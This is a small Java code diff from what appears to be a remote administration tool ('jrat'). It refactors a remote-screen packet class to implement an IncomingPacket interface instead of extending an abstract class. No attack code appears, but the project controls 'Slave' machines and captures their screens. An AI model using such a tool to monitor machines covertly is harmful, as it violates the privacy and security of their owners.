@@ -1,7 +1,7 @@
 package jrat.module.screen.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.controller.packets.outgoing.Packet12RemoteScreen;
 import jrat.controller.utils.CursorUtils;
 import jrat.module.screen.ui.PanelScreenController;
@@ -13,7 +13,7 @@ import java.awt.image.BufferedImage;
  * Received when a frame has successfully transferred
  * Will draw cursor and other optional graphics
  */
-public class PacketRemoteScreenCompleted extends AbstractIncomingPacket {
+public class PacketRemoteScreenCompleted implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
